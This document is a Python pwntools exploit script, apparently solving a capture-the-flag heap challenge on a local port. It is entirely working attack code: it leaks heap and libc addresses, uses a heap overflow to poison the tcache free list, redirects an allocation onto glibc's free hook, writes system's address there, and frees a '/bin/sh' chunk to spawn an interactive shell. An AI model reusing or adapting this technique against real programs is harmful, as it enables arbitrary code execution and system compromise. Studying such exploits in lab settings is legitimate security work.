from pwn import *

r = remote('localhost', 8263)
r.recvuntil('write')

def alloc_one(idx, size):
    r.sendlineafter('> ', '1')
    r.sendlineafter('index: ', str(idx))
    r.sendlineafter('size: ', str(size))


def free_one(idx):
    r.sendlineafter('> ', '2')
    r.sendlineafter('index: ', str(idx))


def read_one(idx, size):
    r.sendlineafter('> ', '3')
    r.sendlineafter('index: ', str(idx))
    r.sendlineafter('size: ', str(size))
    return r.recvn(size)


def write_one(idx, data):
    r.sendlineafter('> ', '4')
    r.sendlineafter('index: ', str(idx))
    r.sendlineafter('size: ', str(len(data)))
    r.send(data)


alloc_one(0, 0x28)
alloc_one(1, 0x28)
write_one(0, "A" * 0x28)
write_one(1, "B" * 0x28)
free_one(1)
key, heapbase = struct.unpack('<QQ', read_one(0, 0x40)[-16:])
log.info(f'heapbase: 0x{heapbase:x}')

alloc_one(1, 0x800)
alloc_one(2, 0x38)
free_one(1)
libcbase = struct.unpack('<Q', read_one(0, 0x70)[-8:])[0] - 0x1c2a60
log.info(f'libcbase: 0x{libcbase:x}')

alloc_one(10, 0x28)
write_one(10, "X" * 0x28)
alloc_one(11, 0x28)
write_one(11, "Y" * 0x28)
alloc_one(12, 0x28)
write_one(12, "Z" * 0x28)
free_one(12)
free_one(11)

write_one(10, b"X" * 0x28 + struct.pack('<QQ', 0x31, key ^ (libcbase + 0x1c5ca0))) # free hook

alloc_one(20, 0x28)
alloc_one(21, 0x28)

write_one(20, "/bin/sh")
write_one(21, p64(libcbase + 0x4a830)) # system

free_one(20)

r.interactive()
